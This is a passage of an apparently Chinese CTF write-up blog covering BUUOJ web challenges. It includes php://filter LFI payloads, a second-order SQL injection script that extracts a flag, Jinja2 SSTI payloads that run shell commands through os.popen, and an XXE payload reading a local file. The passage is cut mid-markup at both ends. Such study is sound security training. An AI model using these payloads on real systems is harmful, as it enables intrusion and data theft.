awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>但过滤了<code>php</code>和<code>flag</code>，不过<code>json decode</code>时会自动把 <code>\u</code> 开头的 Unicode 或者 <code>\x</code> 开头的 hex 转换为正常的字符串。</p><p><code>*ph\u0070://filter/read=convert.base64-encode/resource=\x66lag*</code></p><p>转换成<code>JSON</code>形式，注意键名得是<code>page</code>:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;page&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ph\u0070://filter/read=convert.base64-encode/resource=/\u0066lag&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/encodeencode1.png" alt="encodeencode1"></p><p>尝试<code>\x</code>开头的失败了。。不知道啥原因，网上的<code>wp</code>都用的<code>unicode</code>并没有用hex。</p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>20231231 这题还没做完有个地方没弄懂。。。后面放假补上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//检查文件是否为有效的图像文件</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">//使用的字节值数目不能超过12个</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>strrpos()</code> 函数查找字符串中最后一次出现的位置，然后使用 <code>substr()</code> 函数从该位置的下一个位置开始截取。</p><p>正则匹配了<code>ph</code>(还是&#x2F;i模式)，这样一来php,phtml啥的后缀根本不要想了。<code>mb_strpos()</code> 函数在文件内容中搜索 <code>&lt;?</code> 字符串。如果找到了该字符串，则 <code>mb_strpos()</code> 函数返回字符串的位置，否则返回 <code>false</code>。</p><p>参考<code>https://liotree.github.io/2019/08/21/EasyWeb/</code></p><p><img src="/img/suctf2019ezweb1.png" alt="suctf2019ezweb1"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><img src="/img/wdbunfinish1.png" alt="wdbunfinish1"></p><p><code>register.php</code></p><p><img src="/img/wdbunfinish2.png" alt="wdbunfinish2"></p><p>sb火狐一直弹网站不安全害我注册登录不了。。</p><p><img src="/img/wdbunfinish3.png" alt="wdbunfinish3"></p><p>？</p><p>抓包看下传输过程：</p><p><img src="/img/wdbunfinish4.png" alt="wdbunfinish4"></p><p>可以看到用户名密码直接明文传过去了，注册界面也一样：</p><p><img src="/img/wdbunfinish5.png" alt="wdbunfinish5"></p><p><img src="/img/wdbunfinish6.png" alt="wdbunfinish6"></p><p>源码中会显示注册的用户名。</p><p>这里想着没有注入点的话这个用户名能不能利用，去注册<code>a&#39;#</code>发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到<code>login</code>界面的。</p><p>后面注册了一下<code>aa&#39;</code>还是注册不了，又试了一下<code>aa&#39;&#39;</code>发现能注册：</p><p><img src="/img/wdbunfinish7.png" alt="wdbunfinish7"></p><p>注意这里，我申请的是<code>aa&#39;&#39;</code>但变成<code>aa&#39;</code>了，有个单引号不知道跑哪里去了？</p><p>单引号能注册大概率是存在转义函数，<code>&#39;&#39;</code>进去变成了<code>\&#39;\&#39;</code>，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。</p><p>先想想吞单引号是怎么回事：</p><p><code>aa&#39;&#39;</code> - &gt; <code>aa\&#39;\&#39; </code> -&gt;  <code>aa&#39;</code></p><p>首先用户名进去肯定被单引号包裹<code>&#39;username&#39;</code>，<code>aa&#39;&#39;</code>进去之后转义成<code>aa\&#39;\&#39;</code>，存到数据库里还是怎么样。回显的时候把<code>aa\&#39;\&#39;</code>这东西给拿出来。那怎么做才会吞掉一个单引号呢？</p><p><code>aa&#39;&#39;&#39;&#39;</code> -&gt; <code>aa&#39;&#39;</code></p><p>后面去找了源码看看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users(email,username,password) values(&#x27;&quot;</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from users where email=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>感觉这东西像二次注入+<code>insert</code>注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭</p><p><code>1&#39;and&#39;0</code>:</p><p><img src="/img/wdbunfinish8.png" alt="wdbunfinish8"></p><p>单引号闭合，而且<code>1&#39;and&#39;0</code>这东西变成了<code>0</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>的字符串运算：数值相加<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span> <br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> web的<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br>#参考：https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.csdn.net<span class="hljs-operator">/</span>zzzgd_666<span class="hljs-operator">/</span>article<span class="hljs-operator">/</span>details<span class="hljs-operator">/</span><span class="hljs-number">121704012</span><br>#  https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xz.aliyun.com<span class="hljs-operator">/</span>t<span class="hljs-operator">/</span><span class="hljs-number">10594</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdbunfinish13.png" alt="wdbunfinish13"></p><p><code>0&#39;+hex(database())+&#39;0</code></p><p><img src="/img/wdbunfinish9.png" alt="wdbunfinish9"></p><p>注意这里是十六进制，转换成字符串就是<code>web</code></p><p>爆表的话<code>information</code>这东西被正则匹配掉了，回显<code>nonono</code>。当时想着还能用<code>sys</code>库去代替<code>information_schema</code>：</p><p><img src="/img/wdbunfinish10.png" alt="wdbunfinish10"></p><p>先尝试<code>0&#39;+hex(hex(version()))+&#39;0</code></p><p><img src="/img/wdbbbbbbbbbbunfinifh11.png" alt="wdbbbbbbbbbbunfinifh11"></p><p>出了这么个东西，使用两次<code>hex</code>主要就是为了消除<code>abcd</code>这种字母，而且因为长字符串转成数字型数据的时候会变成科学计数法导致也就是说会丢失数据精度，所以可以一位一位的截。<code>https://xz.aliyun.com/t/2619#toc-3</code></p><p>注意这个数据库的版本：(底下代码<code>select * from flag</code>换成<code>version()</code>就行)</p><p><img src="/img/wdbunfinish12.png" alt="wdbunfinish12"></p><p>师傅们的<code>wp</code>里都是直接<code>select * from flag</code>，<code>flag</code>这个表是猜出来的。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">//参考https://www.cnblogs.com/upfine/p/<span class="hljs-number">16607426.</span>html<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;http://7d3b4912-e6bb-4111-b640-7ab9e2fea080.node4.buuoj.cn:81/&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <span class="hljs-comment"># 这行代码创建了一个BeautifulSoup对象，用于解析网页的HTML内容。response_login.text是一个包含网页HTML内容的字符串，&#x27;html.parser&#x27;是指定使用HTML解析器来解析网页</span><br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p>当然还有利用两次<code>hex</code>去转换的，原理和上面差不多:</p><p><code>0&#39;%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B&#39;0</code></p><p>参考<code>https://syunaht.com/p/3379740036.html</code></p><p><code>https://xz.aliyun.com/t/2619#toc-3</code></p><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/img/doublescret1.png" alt="doublescret1"></p><p><code>dirsearch</code>没扫出来啥，试了试<code>/secret</code>:</p><p><img src="/img/doublesecret2.png" alt="doublesecret2"></p><p><code>/secret?secret=1</code></p><p><img src="/img/doublesecret3.png" alt="doublesecret3"></p><p><code>/secret?secret=secret</code>，开了<code>Debug</code>，发现有这么段东西：</p><p><img src="/img/ciscndoublesrecreet1.png" alt="ciscndoublesrecreet1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#解密，这个算法应该是RC4,然后密钥是HereIsTreasure</span><br>   deS=rc.do_crypt(secret) <span class="hljs-comment"># 加密secret</span><br><br>   a=render_template_string(safe(deS)) <span class="hljs-comment"># deS经过safe过滤然后渲染</span><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure><p>奇怪的是<code>rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)</code>的注释是解密？</p><p><code>RC4</code>找了个网站：<code>http://tool.chacuo.net/cryptrc4</code>，这个结果是一致的(有些虽然也是<code>RC4</code>但结果不一样)：数据加密后是<code>base64</code>编码，然后把它解码就行了。</p><p>后面看wp发现有大佬直接自己写脚本。。太强了orz：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):<span class="hljs-comment">#返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br></code></pre></td></tr></table></figure><p>他这个加密过程大致是我们的输入<code>secret</code>经过<code>RC4</code>后是<code>base64</code>编码，然后渲染输出<code>base64</code>解码的结果。</p><p>存在<code>render_template_string</code>，参数又是可控的，猜测是<code>SSTI</code>。</p><p>我们需要让它<code>render_template_string</code>的参数是<code>payload</code></p><p>先试试<code>&#123;&#123;config&#125;&#125;</code>:<code>.%14ZZ%C2%A4%01%02iv%C2%80</code></p><p><img src="/img/doublesecret5.png" alt="doublesecret5"></p><p>加密：</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>/secret?secret=.J%19S¥%15Km%2B%C2%94ÖS%C2%85%C2%8F¸%C2%97%0B%C2%90X5¤AßMD®%07%C2%8BSß7Ø%12Åré%1Bä*çwÛ%C2%9Eñh%1D%C2%82%25íô%06)%7Fðo%2C%C2%9E9%08Ç÷u.û%C2%95%14¿v%05%19j®LÚ-ãt¬%7FX%2C8L%C2%81ÑHÿöãÚõ%C2%9A¦%23%06§¸»¹ænyØÊj»%25X%15×%C2%84F%24%1As^%C2%9B×¤ j¥/%17%1Cßs¯6Å¥±.è¢Y!¨à%10%C2%8Aa]\%2BÎ°%C2%99à¾%C2%87-%10x ]Ú%0B%C2%882PãÜ%1A%3A%3Fæ² ¢Â¹%0F%0BÕG%23-é¢%19Å²%C2%8F&quot;î£%C2%93lÊ&#123;%03ù¶%C2%92×%11 Üîê%02`![doublesecret4](img/doublesecret4.png)感觉`safe`过滤没啥用，只会提示`xxx is not allowed`，该执行还是会执行读`flag.txt`:`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>先看源码：</p><p><img src="/img/truecookbook1.png" alt="truecookbook1"></p><p>直接访问，但：</p><p><img src="/img/truecookbook2.png" alt="truecookbook2"></p><p>没法访问，这里应该是要传东西进去</p><p>抓包：</p><p><img src="/img/rutecookbook4.png" alt="rutecookbook4"></p><p>请求与响应包的携带的数据都是<code>XML</code>格式，并且返回包中的<code>msg</code>标签值与请求包中的<code>username</code>标签值相同。尝试使用<code>XXE</code>，数据注入点在<code>username</code>标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook5.png" 